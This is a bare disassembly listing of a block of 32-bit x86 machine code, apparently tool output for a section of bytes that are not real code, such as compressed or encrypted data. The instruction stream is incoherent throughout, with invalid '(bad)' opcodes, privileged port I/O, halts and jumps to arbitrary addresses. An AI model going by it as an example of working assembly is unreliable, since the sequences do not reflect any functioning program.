  41baec:	rcl    BYTE PTR [ebx+edx*1-0x61],cl
  41baf0:	rcr    BYTE PTR [eax+0x16f1b5aa],1
  41baf6:	adc    al,0xf0
  41baf8:	xor    edx,DWORD PTR [ebx]
  41bafa:	pop    esi
  41bafb:	iret   
  41bafc:	pop    edi
  41bafd:	mov    BYTE PTR [edx],dl
  41baff:	add    DWORD PTR [ebx-0x25517a1],esp
  41bb05:	mov    ecx,0x6a33ca1b
  41bb0a:	(bad)  
  41bb0b:	out    0xe4,eax
  41bb0d:	mul    DWORD PTR [ecx]
  41bb0f:	mov    cl,0x93
  41bb11:	cld    
  41bb12:	pop    esp
  41bb13:	and    al,0x61
  41bb15:	shl    esi,1
  41bb17:	inc    esp
  41bb18:	cmp    DWORD PTR [esi+0x46],eax
  41bb1b:	mov    ds:0x2ad14011,al
  41bb20:	sti    
  41bb21:	push   edx
  41bb22:	mov    bl,0xf
  41bb24:	inc    ebp
  41bb25:	inc    edx
  41bb26:	fidivr WORD PTR [ebx+0x47e2f978]
  41bb2c:	idiv   ebx
  41bb2e:	rcl    BYTE PTR [ecx],cl
  41bb30:	daa    
  41bb31:	test   eax,0x8d7613d0
  41bb36:	add    edi,DWORD PTR [ecx]
  41bb38:	loopne 0x41bb18
  41bb3a:	pop    eax
  41bb3b:	out    0x65,eax
  41bb3d:	jp     0x41bb96
  41bb3f:	sbb    ebp,DWORD PTR [ebx]
  41bb41:	dec    edx
  41bb42:	in     al,0x46
  41bb44:	aaa    
  41bb45:	sbb    esp,DWORD PTR [ecx+0x10]
  41bb48:	ja     0x41bb87
  41bb4a:	mov    esp,0x5a2a2fde
  41bb4f:	das    
  41bb50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb51:	add    al,0x40
  41bb53:	ins    BYTE PTR es:[edi],dx
  41bb54:	sub    cl,BYTE PTR [ecx-0x1e]
  41bb57:	adc    al,0xe0
  41bb59:	inc    eax
  41bb5a:	das    
  41bb5b:	fcomp  DWORD PTR [ecx-0x28]
  41bb5e:	cmp    bh,dh
  41bb60:	mov    bh,0xb5
  41bb62:	lahf   
  41bb63:	lock test BYTE PTR [eax+eiz*1-0x72b39382],cl
  41bb6b:	jmp    0x377bd4d3
  41bb70:	out    dx,eax
  41bb71:	mov    ecx,0xdc89aa64
  41bb76:	aad    0x2d
  41bb78:	push   0xc8aa694d
  41bb7d:	(bad)  
  41bb7e:	xchg   ebx,eax
  41bb7f:	jl     0x41bb84
  41bb81:	lock cmp ebp,edi
  41bb84:	mov    ds:0xc23bcf7e,al
  41bb89:	out    dx,eax
  41bb8a:	mov    esi,0xf58b3485
  41bb8f:	cmc    
  41bb90:	daa    
  41bb91:	enter  0x1903,0x64
  41bb95:	fs jns 0x41bb49
  41bb98:	jecxz  0x41bba8
  41bb9a:	mov    esi,0x918675b8
  41bb9f:	mov    al,BYTE PTR [ebx-0x4b]
  41bba2:	or     DWORD PTR [esp+edi*8-0x668d0967],eax
  41bba9:	sbb    al,0x4f
  41bbab:	pop    ecx
  41bbac:	scas   eax,DWORD PTR es:[edi]
  41bbad:	test   eax,0x6816be85
  41bbb2:	jnp    0x41bba6
  41bbb4:	nop
  41bbb5:	and    bh,bl
  41bbb7:	sbb    eax,0x25bb6e4c
  41bbbc:	clc    
  41bbbd:	pop    ebx
  41bbbe:	pop    eax
  41bbbf:	mov    dl,0x9b
  41bbc1:	lea    ecx,[edx-0x1c]
  41bbc4:	mov    al,0x7b
  41bbc6:	xlat   BYTE PTR ds:[ebx]
  41bbc7:	dec    ecx
  41bbc8:	(bad)  
  41bbc9:	or     ecx,DWORD PTR [eax+eiz*1]
  41bbcc:	out    0xd1,eax
  41bbce:	ds push es
  41bbd0:	cmovnp esp,DWORD PTR [ecx+eiz*1-0x5f]
  41bbd5:	aas    
  41bbd6:	lea    esp,[ebx+ecx*2+0x71]
  41bbda:	inc    ecx
  41bbdb:	mov    al,0x3c
  41bbdd:	pop    edx
  41bbde:	fs ja  0x41bb7b
  41bbe1:	cmp    ch,al
  41bbe3:	es xor eax,0xd3fb501f
  41bbe9:	fisubr WORD PTR [ebp+0x10d5948c]
  41bbef:	test   al,0x91
  41bbf1:	bound  ebp,QWORD PTR [eax]
  41bbf3:	clc    
  41bbf4:	ja     0x41bb8b
  41bbf6:	repnz mov cs,WORD PTR [ecx+0x6a]
  41bbfa:	and    al,0xb8
  41bbfc:	data16 jbe 0x41bc03
  41bbff:	sbb    ah,BYTE PTR [esi]
  41bc01:	nop
  41bc02:	cmp    ch,cl
  41bc04:	ins    DWORD PTR es:[edi],dx
  41bc05:	xchg   edx,eax
  41bc06:	nop
  41bc07:	mov    dh,dl
  41bc09:	xlat   BYTE PTR ds:[ebx]
  41bc0a:	leave  
  41bc0b:	sub    BYTE PTR [esi+0x6f],cl
  41bc0e:	mov    ebx,0x696704a6
  41bc13:	sub    ebp,eax
  41bc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc16:	nop
  41bc17:	add    eax,0x5790c3d1
  41bc1c:	mov    eax,0x46a49be3
  41bc21:	cmp    bh,cl
  41bc23:	dec    eax
  41bc24:	leave  
  41bc25:	pushf  
  41bc26:	lock pop edi
  41bc28:	mov    ebp,0xfdcc3696
  41bc2d:	adc    BYTE PTR [ebp-0x42],bl
  41bc30:	mov    dl,0x20
  41bc32:	fst    QWORD PTR [ebx-0x400ebf79]
  41bc38:	sbb    BYTE PTR [edi],al
  41bc3a:	fnstenv [edi+0x61]
  41bc3d:	pop    esp
  41bc3e:	call   0x8698d42
  41bc43:	imul   ecx,DWORD PTR [edx+0x1e],0xe69e7cd2
  41bc4a:	inc    edi
  41bc4b:	cmp    edx,DWORD PTR [ecx+0x3ea831a2]
  41bc51:	push   eax
  41bc52:	mov    edx,0x7ab3b39c
  41bc57:	push   ds
  41bc58:	js     0x41bcb2
  41bc5a:	pop    ss
  41bc5b:	jmp    0xbd3f:0x60170985
  41bc62:	adc    bh,BYTE PTR [ebp-0x7beb7df7]
  41bc68:	inc    esi
  41bc69:	push   edx
  41bc6a:	jl     0x41bc1d
  41bc6c:	jmp    0x431f:0x78d060a6
  41bc73:	sub    dh,al
  41bc75:	mov    bl,0x60
  41bc77:	xchg   edi,eax
  41bc78:	xchg   esp,eax
  41bc79:	popw   es
  41bc7b:	in     eax,0x6a
  41bc7d:	test   DWORD PTR [edx],esp
  41bc7f:	dec    eax
  41bc80:	jmp    0x41bc6d
  41bc82:	or     eax,ecx
  41bc84:	inc    ecx
  41bc85:	jno    0x41bc7e
  41bc87:	sub    eax,0x10f7b5f9
  41bc8c:	sbb    eax,0x3eb917b
  41bc91:	test   eax,ebp
  41bc93:	xchg   edx,eax
  41bc94:	jmp    0x3dd0c8d7
  41bc99:	lods   eax,DWORD PTR ds:[esi]
  41bc9a:	retf   
  41bc9b:	pop    esi
  41bc9c:	in     eax,0xbd
  41bc9e:	cmp    al,0xd8
  41bca0:	ror    ah,0x94
  41bca3:	gs aam 0x49
  41bca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bca7:	push   es
  41bca8:	push   edi
  41bca9:	ror    DWORD PTR [ebx+eax*8],0xb
  41bcad:	cli    
  41bcae:	adc    eax,0x77cfa51b
  41bcb3:	jmp    0x1801234c
  41bcb8:	jle    0x41bc6f
  41bcba:	mov    bh,BYTE PTR [edx-0x4e730f63]
  41bcc0:	lods   eax,DWORD PTR ds:[esi]
  41bcc1:	lods   eax,DWORD PTR ds:[esi]
  41bcc2:	ret    0x361a
  41bcc5:	loope  0x41bd34
  41bcc7:	push   esp
  41bcc8:	inc    esp
  41bcc9:	imul   ebx,DWORD PTR [esp+eax*2-0x30],0xffffff8a
  41bcce:	pop    ecx
  41bccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcd0:	loop   0x41bd48
  41bcd2:	inc    esi
  41bcd3:	sti    
  41bcd4:	ja     0x41bc7c
  41bcd6:	mov    eax,0x18f71ef1
  41bcdb:	xor    ebp,DWORD PTR [ecx-0xe1f17e7]
  41bce1:	aas    
  41bce2:	sbb    esp,DWORD PTR [ebx*2+0x11f80534]
  41bce9:	stos   BYTE PTR es:[edi],al
  41bcea:	arpl   WORD PTR [edx],ax
  41bcec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bced:	jne    0x41bd66
  41bcef:	ins    BYTE PTR es:[edi],dx
  41bcf0:	push   ss
  41bcf1:	jae    0x41bcb7
  41bcf3:	sbb    eax,DWORD PTR [ebx+0x68]
  41bcf6:	ins    DWORD PTR es:[edi],dx
  41bcf7:	(bad)
  41bcfa:	sbb    eax,0x50d3a130
  41bcff:	inc    edx
  41bd00:	retf   0x12b8
  41bd03:	jge    0x41bcf4
  41bd05:	call   0xfac0:0xd7d712de
  41bd0c:	dec    edi
  41bd0d:	repnz lea ebx,[edx+ebp*1-0x69a249af]
  41bd15:	retf   
  41bd16:	(bad)  
  41bd17:	sub    BYTE PTR ds:0x5df387f9,bl
  41bd1d:	retf   
  41bd1e:	inc    ebp
  41bd1f:	add    al,ah
  41bd21:	in     eax,0x4f
  41bd23:	sbb    dl,al
  41bd25:	dec    esp
  41bd26:	dec    edi
  41bd27:	outs   dx,BYTE PTR ds:[esi]
  41bd28:	aaa    
  41bd29:	pop    esi
  41bd2a:	aas    
  41bd2b:	add    esi,esp
  41bd2d:	ret    0xbdf8
  41bd30:	push   ebp
  41bd31:	jp     0x41bcf3
  41bd33:	loopne 0x41bd3f
  41bd35:	cwde   
  41bd36:	mov    cl,0x4d
  41bd38:	push   ecx
  41bd39:	out    0x6d,eax
  41bd3b:	lahf   
  41bd3c:	rcl    BYTE PTR [esi+0x89796e5],1
  41bd42:	add    BYTE PTR [eax-0x4b],ch
  41bd45:	mov    edx,0xd358877f
  41bd4a:	pop    eax
  41bd4b:	scas   al,BYTE PTR es:[edi]
  41bd4c:	in     eax,dx
  41bd4d:	cmp    ebp,ebp
  41bd4f:	xchg   edx,eax
  41bd50:	int3   
  41bd51:	in     al,0xe4
  41bd53:	mov    eax,0xe6458fed
  41bd58:	xor    eax,0x7833b8e4
  41bd5d:	sub    eax,0x3a0661f
  41bd62:	(bad)  
  41bd63:	pusha  
  41bd64:	ds cmp edx,eax
  41bd67:	mov    esp,0x44e66a4d
  41bd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd6d:	mov    WORD PTR [ebx-0x2b528c10],gs
  41bd73:	hlt    
  41bd74:	(bad)  
  41bd75:	nop
  41bd76:	adc    DWORD PTR [edi+0x711d90e6],ebp
  41bd7c:	fsubr  st,st(7)
  41bd7e:	lods   al,BYTE PTR gs:[esi]
  41bd80:	test   DWORD PTR [ebp-0x34dd1861],ebp
  41bd86:	ja     0x41bd81
  41bd88:	adc    al,0x87
  41bd8a:	fidiv  DWORD PTR [eax-0x462612ea]
  41bd90:	mov    ebx,0x1db10a95
  41bd95:	pop    ecx
  41bd96:	adc    cl,BYTE PTR [eax-0x7fad735e]
  41bd9c:	cdq    
  41bd9d:	data16 fsubr DWORD PTR cs:[esi+eax*4-0x49]
  41bda3:	add    eax,0xda31f96c
  41bda8:	or     edx,eax
  41bdaa:	inc    esi
  41bdab:	add    ebx,edx
  41bdad:	xor    DWORD PTR [ebp-0x2a],edx
  41bdb0:	push   ss
  41bdb1:	js     0x41be09
  41bdb3:	pop    ebx
  41bdb4:	mov    DWORD PTR [edi-0x242ec129],ecx
  41bdba:	int3   
  41bdbb:	and    eax,0x76ffb7f3
  41bdc0:	stos   DWORD PTR es:[edi],eax
  41bdc1:	adc    al,0xec
  41bdc3:	stos   DWORD PTR es:[edi],eax
  41bdc4:	lds    ecx,FWORD PTR [edi-0x275dc3aa]
  41bdca:	cmp    eax,0x391fbd00
  41bdcf:	cwde   
  41bdd0:	jns    0x41bdf0
  41bdd2:	pop    ss
  41bdd3:	xor    al,0xf9
  41bdd5:	scas   al,BYTE PTR es:[edi]
  41bdd6:	mov    esi,0x133fae5f
  41bddb:	into   
  41bddc:	(bad)  
  41bddd:	xor    eax,0xed805976
  41bde2:	aad    0x76
  41bde4:	mov    eax,0x965d32ed
  41bde9:	shr    BYTE PTR [ecx],0x2d
  41bdec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bded:	jnp    0x41bd9b
  41bdef:	ins    BYTE PTR es:[edi],dx
  41bdf0:	test   DWORD PTR [ebx-0x7],esi
  41bdf3:	(bad)  
  41bdf4:	imul   ebp,DWORD PTR [ecx],0x34
  41bdf7:	shl    BYTE PTR [eax],cl
  41bdf9:	sub    BYTE PTR [edx-0x26ffc07d],dh
  41bdff:	cdq    
  41be00:	push   esp
  41be01:	(bad)  
  41be02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be03:	mov    ch,0x77
  41be05:	cmp    cl,BYTE PTR ds:0xc66feddf
  41be0b:	mov    ds:0xfe83c2f5,eax
  41be10:	sti    
  41be11:	sbb    DWORD PTR [edx+eiz*8],0xffffffe2
  41be15:	daa    
  41be16:	pop    esp
  41be17:	mov    edx,0xaf0f037e
  41be1c:	pushf  
  41be1d:	sti    
  41be1e:	cmp    DWORD PTR [edx],eax
  41be20:	xchg   ebp,eax
  41be21:	push   cs
  41be22:	dec    ebp
  41be23:	mov    al,fs:0x25aac80b
  41be29:	ja     0x41bdea
  41be2b:	mov    bh,0x56
  41be2d:	lock jns 0x41be45
  41be30:	mov    db1,edi
  41be33:	xor    eax,0xdf32bd3b
  41be38:	aaa    
  41be39:	xchg   ecx,eax
  41be3a:	outs   dx,DWORD PTR ds:[esi]
  41be3b:	xchg   BYTE PTR [eax],bl
  41be3d:	and    ch,BYTE PTR [esi]
  41be3f:	imul   DWORD PTR [edi-0x4f]
  41be42:	cdq    
  41be43:	les    esp,FWORD PTR [eax+0x28]
  41be46:	sub    BYTE PTR [esi-0x43d4d006],ch
  41be4c:	dec    edi
  41be4d:	ins    DWORD PTR es:[edi],dx
  41be4e:	jl     0x41be1c
  41be50:	xor    DWORD PTR [edx],ebx
  41be52:	jbe    0x41be07
  41be54:	outs   dx,DWORD PTR ds:[esi]
  41be55:	and    DWORD PTR [ebx+eiz*4],0xffffffa8
  41be59:	pop    ds
  41be5a:	add    ecx,0x24
  41be5d:	jnp    0x41be56
  41be5f:	push   cs
  41be60:	and    BYTE PTR [edx-0x51],ch
  41be63:	outs   dx,BYTE PTR ds:[esi]
  41be64:	dec    esp
  41be65:	sub    al,0x79
  41be67:	scas   al,BYTE PTR es:[edi]
  41be68:	out    dx,eax
  41be69:	or     DWORD PTR [ebp-0x4a803f6a],edi
  41be6f:	dec    edx
  41be70:	pop    esp
  41be71:	or     eax,0x8e630531
  41be76:	ret    0x2c01
  41be79:	pop    edx
  41be7a:	inc    ebp
  41be7b:	test   BYTE PTR [esi],0x7b
  41be7e:	test   eax,0xdf4edbfe
  41be83:	push   esp
  41be84:	xlat   BYTE PTR ds:[ebx]
  41be85:	das    
  41be86:	das    
  41be87:	jno    0x41be16
  41be89:	sbb    eax,0x38ba2c39
  41be8e:	xor    BYTE PTR [ebx-0x517f8d84],al
  41be94:	or     al,0x4f
  41be96:	nop
  41be97:	(bad)  
  41be98:	sub    eax,0xfa72d6f8
  41be9d:	mov    bh,BYTE PTR [eax+0x76]
  41bea0:	mov    ds:0x629426e5,eax
  41bea5:	loop   0x41be52
  41bea7:	dec    ecx
  41bea8:	call   0xbbd6e065
  41bead:	adc    eax,0xb80143da
  41beb2:	lea    ecx,[edx+0x3e090a7a]
  41beb8:	cld    
  41beb9:	imul   esi,DWORD PTR [ebx+0x7d5e31b8],0x1c
  41bec0:	xor    dl,ah
  41bec2:	sub    BYTE PTR [ecx-0x1a7b2f7f],al
  41bec8:	fist   DWORD PTR [edi]
  41beca:	jl     0x41be5c
  41becc:	mov    DWORD PTR [ebx],edi
  41bece:	leave  
  41becf:	xchg   esp,eax
  41bed0:	xchg   ebp,eax
  41bed1:	jge    0x41bf23
  41bed3:	or     ebp,0x9d19a3c9
  41bed9:	bt     DWORD PTR [edi],ebx
  41bedc:	test   al,0xac
  41bede:	mov    ecx,0xaa4de4cc
  41bee3:	jns    0x41be86
  41bee5:	jl     0x41bf4e
  41bee7:	mov    ah,0xa7
  41bee9:	lods   al,BYTE PTR ds:[esi]
  41beea:	mov    BYTE PTR [eax-0x80dada],bh
  41bef0:	popa   
  41bef1:	loope  0x41befe
  41bef3:	jne    0x41bea7
  41bef5:	loop   0x41bedf
  41bef7:	push   eax
  41bef8:	inc    esp
  41bef9:	mov    ah,0x75
  41befb:	sub    ecx,edi
  41befd:	mov    eax,ds:0xfb443b02
  41bf02:	and    al,0xde
  41bf04:	mov    dl,0xa7
  41bf06:	jle    0x41be9b
  41bf08:	dec    eax
  41bf09:	sbb    DWORD PTR [edi],esi
  41bf0b:	inc    esp
  41bf0c:	pop    edx
  41bf0d:	js     0x41bf8c
  41bf0f:	ret    0xadca
  41bf12:	pop    ds
  41bf13:	sbb    ah,BYTE PTR [ecx+ebp*2-0x55d8c4be]
  41bf1a:	jbe    0x41becd
  41bf1c:	les    ebp,FWORD PTR [edi+0x77264043]
  41bf22:	jno    0x41bef9
  41bf24:	jnp    0x41bf7a
  41bf26:	adc    eax,0xec352867
  41bf2b:	jae    0x41bef1
  41bf2d:	(bad)  
  41bf2e:	xor    ch,cl
  41bf30:	imul   edx,edx,0xffffffca
  41bf33:	(bad)  [edx]
  41bf35:	pushf  
  41bf36:	outs   dx,DWORD PTR ds:[esi]
  41bf37:	add    eax,0x2253b3d2
  41bf3c:	jl     0x41bfbc
  41bf3e:	stc    
  41bf3f:	enter  0xd77b,0x57
  41bf43:	out    dx,eax
  41bf44:	adc    eax,0x382f2b0c
  41bf49:	mov    dl,0x19
  41bf4b:	loop   0x41bed1
  41bf4d:	mov    DWORD PTR [esi+0x3c82db3d],ebp
  41bf53:	mov    al,0x92
  41bf55:	out    dx,al
  41bf56:	pop    ecx
  41bf57:	mov    ah,0x74
  41bf59:	stc    
  41bf5a:	sub    bh,BYTE PTR [esi]
  41bf5c:	jecxz  0x41bfac
  41bf5e:	in     eax,0x15
  41bf60:	jecxz  0x41bf5a
  41bf62:	dec    ebp
  41bf63:	or     eax,0x46008143
  41bf68:	fwait
  41bf69:	dec    ebx
  41bf6a:	mov    eax,0x59c073d3
  41bf6f:	mov    edi,DWORD PTR [edx]
  41bf71:	rcl    esp,0xd5
  41bf74:	cmp    DWORD PTR [eax+ebp*1],ebx
  41bf77:	or     al,BYTE PTR [ecx-0x59]
  41bf7a:	xchg   esi,eax
  41bf7b:	ror    BYTE PTR [edx-0x52],cl
  41bf7e:	loopne 0x41bf0c
  41bf80:	mov    al,ds:0xc6a367a3
  41bf85:	xchg   esi,eax
  41bf86:	lods   eax,DWORD PTR ds:[esi]
  41bf87:	mov    cl,0x61
  41bf89:	sub    BYTE PTR [edx+0x14],0xd6
  41bf8d:	fwait
  41bf8e:	outs   dx,BYTE PTR ds:[esi]
  41bf8f:	sub    eax,DWORD PTR [ebp+0x1b]
  41bf92:	inc    edx
  41bf93:	and    ecx,DWORD PTR [ebx-0x33]
  41bf96:	jecxz  0x41bfd4
  41bf98:	xor    ecx,ecx
  41bf9a:	inc    edi
  41bf9b:	nop
  41bf9c:	shl    cl,1
  41bf9e:	(bad)  
  41bf9f:	rol    BYTE PTR [edi-0x15],0x78
  41bfa3:	retf   0x7b0f
  41bfa6:	and    al,dh
  41bfa8:	mov    edx,DWORD PTR [ebp-0x33127f2f]
  41bfae:	dec    esp
  41bfaf:	mov    bh,0xbc
  41bfb1:	aas    
  41bfb2:	sub    al,0xc0
  41bfb4:	mov    edx,0xdb42a163
  41bfb9:	mov    al,0xc3
  41bfbb:	xchg   bl,bh
  41bfbd:	sar    DWORD PTR [eax+0x55739f93],cl
  41bfc3:	mov    edi,0xf91da09b
  41bfc8:	hlt    
  41bfc9:	push   ds
  41bfca:	adc    BYTE PTR [edx+0x4],bl
  41bfcd:	cmp    ch,BYTE PTR [edx+0x427e2d8f]
  41bfd3:	mov    BYTE PTR [eax-0x26d41817],al
  41bfd9:	fwait
  41bfda:	ins    DWORD PTR es:[edi],dx
  41bfdb:	xchg   ebp,eax
  41bfdc:	inc    edi
  41bfdd:	stos   DWORD PTR es:[edi],eax
  41bfde:	dec    esi
  41bfdf:	ins    BYTE PTR es:[edi],dx
  41bfe0:	cwde   
  41bfe1:	idiv   dl
  41bfe3:	arpl   WORD PTR [ebx+0x70d5cf36],bp
  41bfe9:	xchg   DWORD PTR ds:0x4b0cc32a,ebx
  41bfef:	push   0x4a
  41bff1:	ds loop 0x41bffa
  41bff4:	shl    DWORD PTR [esi-0x2c],0x63
  41bff8:	fmul   QWORD PTR [esi+0x6ee66e6e]
  41bffe:	ins    BYTE PTR es:[edi],dx
  41bfff:	lock pop eax
  41c001:	lea    ecx,ds:0x516cc7fd
  41c007:	xchg   esi,eax
  41c008:	jb     0x41c026
  41c00a:	push   ecx
  41c00b:	dec    ecx
  41c00c:	jb     0x41c026
  41c00e:	xor    DWORD PTR [ecx-0x7f],ecx
  41c011:	loop   0x41c050
  41c013:	arpl   WORD PTR [ebp-0x21],bx
  41c016:	in     eax,dx
  41c017:	and    eax,0x3a0b4e7b
  41c01c:	cmp    BYTE PTR [ebp-0x39],dh
  41c01f:	das    
  41c020:	ds push esp
  41c022:	test   DWORD PTR [edx],esp
  41c024:	nop
  41c025:	dec    eax
  41c026:	mov    bh,0x75
  41c028:	in     al,0xaf
  41c02a:	loope  0x41bfdb
  41c02c:	scas   al,BYTE PTR es:[edi]
  41c02d:	adc    ah,BYTE PTR [edx]
  41c02f:	push   cs
  41c030:	(bad)  
  41c031:	loop   0x41c071
  41c033:	shl    dh,1
  41c035:	jle    0x41c076
  41c037:	jmp    0x41c026
  41c039:	out    dx,eax
  41c03a:	adc    BYTE PTR [eax],dl
  41c03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c03d:	repnz cdq 
  41c03f:	push   cs
  41c040:	mov    eax,DWORD PTR [edi+0x2b]
  41c043:	xchg   edx,eax
  41c044:	js     0x41bfd3
  41c046:	jnp    0x41c0b8
  41c048:	leave  
  41c049:	ss imul edx,ebp,0xa
  41c04d:	jmp    0x5a86:0xfdbb3446
  41c054:	mov    dh,0xf1
  41c056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c057:	mov    ebp,0xc85b927d
  41c05c:	out    0x8,eax
  41c05e:	xchg   esi,eax
  41c05f:	gs pop es
  41c061:	mov    bl,0x2f
  41c063:	(bad)  
  41c064:	fldenv [edi]
  41c066:	js     0x41c08f
  41c068:	je     0x41c031
  41c06a:	loopne 0x41c04e
  41c06c:	mov    dl,0x6c
  41c06e:	mov    DWORD PTR [edx-0x5ffb954e],ebp
  41c074:	retf   0xf56
  41c077:	mov    WORD PTR [esi],?
  41c079:	mov    al,BYTE PTR [ecx]
  41c07b:	mov    ebp,esi
  41c07d:	pop    edx
  41c07e:	inc    eax
  41c07f:	or     DWORD PTR [edx-0x6e],esp
  41c082:	idiv   BYTE PTR [esp+eiz*2+0x380b7e63]
  41c089:	fisub  WORD PTR [ebx-0x37]
  41c08c:	jmp    0x41c0e9
  41c08e:	xor    ch,0x87
  41c091:	mov    ds:0x23806917,al
  41c096:	lahf   
  41c097:	push   ebx
  41c098:	in     eax,dx
  41c099:	bound  esi,QWORD PTR [edx]
  41c09b:	or     eax,0x82ae6bd9
  41c0a0:	lods   eax,DWORD PTR ds:[esi]
  41c0a1:	mov    WORD PTR [ebp+0x168974e2],cs
  41c0a7:	mov    eax,DWORD PTR [eax+0x3b]
  41c0aa:	call   0x5e77cda0
  41c0af:	leave  
  41c0b0:	scas   al,BYTE PTR es:[edi]
  41c0b1:	or     eax,0xcd9c4661
  41c0b6:	or     DWORD PTR [ebx+0x5b],0xffffffab
  41c0ba:	mov    ecx,0xd9f11332
  41c0bf:	ds cmp eax,0xdf55e6c6
  41c0c5:	int    0xb
  41c0c7:	dec    eax
  41c0c8:	and    eax,0x29570c23
  41c0cd:	aad    0x31
  41c0cf:	imul   eax,DWORD PTR [esi],0xffffff8a
  41c0d2:	add    ah,al
  41c0d4:	jb     0x41c0a6
  41c0d6:	shl    dh,0x2f
  41c0d9:	mov    al,ds:0xace17be4
  41c0de:	hlt    
  41c0df:	fstp   QWORD PTR [ecx+0x41]
  41c0e2:	inc    edi
  41c0e3:	fwait
  41c0e4:	dec    ebp
  41c0e5:	mov    ebp,0x42da81a
  41c0ea:	xor    edi,DWORD PTR [ebx+0x3b]
  41c0ed:	push   edx
  41c0ee:	inc    ecx
  41c0ef:	push   cs
  41c0f0:	jmp    DWORD PTR [edi-0x5e]
  41c0f3:	dec    ebp
  41c0f4:	or     DWORD PTR [edx],0x7
  41c0f7:	shr    BYTE PTR [eax-0x28],0x27
  41c0fb:	xlat   BYTE PTR ds:[ebx]
  41c0fc:	loopne 0x41c108
  41c0fe:	mov    edi,0xa072c130
  41c103:	jmp    0x41c148
  41c105:	push   esi
  41c106:	or     al,0x44
  41c108:	aas    
  41c109:	popf   
  41c10a:	push   ebx
  41c10b:	adc    DWORD PTR [edx-0x3895a268],eax
  41c111:	add    eax,0x52831c92
  41c116:	test   DWORD PTR [edi],eax
  41c118:	call   0xf775:0x87fd1709
  41c11f:	inc    ecx
  41c120:	mov    edx,0x6ff4605b
  41c125:	sub    eax,0x1d5a87b3
  41c12a:	sbb    ch,ch
  41c12c:	int3   
  41c12d:	push   esp
  41c12e:	fisub  DWORD PTR [eax]
  41c130:	into   
  41c131:	retf   0xef4f
  41c134:	imul   ebp,DWORD PTR [eax-0x34],0x70
  41c138:	inc    esi
  41c139:	cmc    
  41c13a:	(bad)  
  41c13b:	aas    
  41c13c:	sub    eax,0x86005465
  41c141:	push   eax
  41c142:	(bad)  
  41c143:	mov    dh,0xb8
  41c145:	push   ds
  41c146:	push   esi
  41c147:	cmp    al,0x69
  41c149:	adc    eax,0x437ea6f0
  41c14e:	ret    
  41c14f:	ret    0xb208
  41c152:	aaa    
  41c153:	sbb    eax,0x2cccdc7b
  41c158:	mov    ch,0x1e
  41c15a:	xor    al,0x87
  41c15c:	arpl   WORD PTR [ebx+edi*4+0x1f3fe3e8],ax
  41c163:	mov    ebp,0xe12ecc15
  41c168:	les    ebx,FWORD PTR [esp+ecx*4]
  41c16b:	jns    0x41c194
  41c16d:	cwde   
  41c16e:	js     0x41c145
  41c170:	(bad)  
  41c171:	mov    ch,0xfd
  41c173:	pop    es
  41c174:	xor    dl,BYTE PTR [edx]
  41c176:	cld    
  41c177:	ins    BYTE PTR es:[edi],dx
  41c178:	pop    ds
  41c179:	loope  0x41c1d4
  41c17b:	inc    esp
  41c17c:	sub    DWORD PTR [ecx],ecx
  41c17e:	pop    esi
  41c17f:	js     0x41c1fb
  41c181:	loope  0x41c1b8
  41c183:	and    al,BYTE PTR [ebp+0x63]
  41c186:	(bad)  
  41c187:	push   ecx
  41c188:	jmp    0xf063703
  41c18d:	je     0x41c1f5
  41c18f:	adc    al,0xe
  41c191:	push   eax
  41c192:	xchg   edx,eax
  41c193:	div    DWORD PTR ds:0x1245c1f9
  41c199:	mov    bl,0x36
  41c19b:	cmc    
  41c19c:	aad    0xf3
  41c19e:	and    BYTE PTR [eax-0xc],ch
  41c1a1:	jp     0x41c1af
  41c1a3:	xchg   esi,eax
  41c1a4:	fcmovbe st,st(5)
  41c1a6:	mov    eax,0x26c3a845
  41c1ab:	fidiv  WORD PTR [edx]
  41c1ad:	bound  eax,QWORD PTR [edi-0x4f966146]
  41c1b3:	test   eax,0x620877ea
  41c1b8:	sbb    esp,ebx
  41c1ba:	and    al,0xa
  41c1bc:	cmp    edi,eax
  41c1be:	mov    esp,0xab7a6862
  41c1c3:	inc    edi
  41c1c4:	mov    edi,0x675b352b
  41c1c9:	dec    eax
  41c1ca:	jmp    0x2f6b:0x42cb5212
  41c1d1:	or     edi,DWORD PTR [edi+0x69]
  41c1d4:	pop    ds
  41c1d5:	(bad)  
  41c1d6:	and    esi,DWORD PTR [eax+0x49]
  41c1d9:	add    al,0xef
  41c1db:	jb     0x41c1f6
  41c1dd:	push   edx
  41c1de:	or     eax,eax
  41c1e0:	fs cdq 
  41c1e2:	pop    edx
  41c1e3:	into   
  41c1e4:	pop    esp
  41c1e5:	sahf   
  41c1e6:	push   ecx
  41c1e7:	xchg   esi,eax
  41c1e8:	retf   
  41c1e9:	jecxz  0x41c1c1
  41c1eb:	jle    0x41c1a2
  41c1ed:	fwait
  41c1ee:	jns    0x41c225
  41c1f0:	aad    0xe2
  41c1f2:	into   
  41c1f3:	ss std 
  41c1f5:	sub    eax,0x5b633a86
  41c1fa:	dec    ebx
  41c1fb:	lds    ebx,FWORD PTR [ebx]
  41c1fd:	adc    dl,ch
  41c1ff:	cmp    bh,BYTE PTR [esi]
  41c201:	rcl    DWORD PTR ds:0xcef598cf,1
  41c207:	sub    eax,0x4693f15c
  41c20c:	mov    esi,ecx
  41c20e:	cdq    
  41c20f:	cmp    eax,0xbfc573e7
  41c214:	scas   eax,DWORD PTR es:[edi]
  41c215:	mov    dl,0x41
  41c217:	jno    0x41c1ac
  41c219:	push   ss
  41c21a:	or     bl,BYTE PTR [edi-0x6cbcc88a]
  41c220:	push   ss
  41c221:	outs   dx,BYTE PTR ds:[esi]
  41c222:	repnz mov esi,0xb1df1f1
  41c228:	sbb    eax,0x9a1aae3b
  41c22d:	test   BYTE PTR [ecx],ch
  41c22f:	jl     0x41c238
  41c231:	data16 test al,0xb1
  41c235:	xchg   esi,eax
  41c236:	dec    ecx
  41c237:	pop    ecx
  41c238:	cwde   
  41c239:	push   ss
  41c23a:	dec    eax
  41c23b:	icebp  
